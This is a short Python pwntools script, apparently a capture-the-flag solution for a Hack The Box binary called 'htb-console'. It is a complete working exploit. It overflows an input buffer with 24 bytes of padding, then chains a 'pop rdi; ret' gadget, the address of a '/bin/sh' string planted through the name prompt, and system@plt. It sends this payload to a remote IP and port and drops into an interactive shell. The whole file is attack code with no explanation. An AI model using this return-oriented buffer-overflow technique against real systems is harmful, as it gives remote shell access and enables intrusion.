from pwn import *

address = '94.237.61.180'
port = 50251

context.log_level = 'critical'
context.binary = binary = ELF('./htb-console')
rop = ROP(binary)

pop_rdi_ret_addr = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
system_addr = p64(binary.plt.system)
bin_sh_addr = p64(0x004040b0)

offset = b'A' * 24

payload = offset
payload += pop_rdi_ret_addr
payload += bin_sh_addr
payload += system_addr


with remote(address, port) as target:
	target.sendlineafter(b'>> ', b'hof')
	target.sendlineafter(b'Enter your name: ', b'/bin/sh\x00')
	target.sendlineafter(b'>> ', b'flag')
	target.sendlineafter(b'Enter flag: ', payload)
	target.interactive()



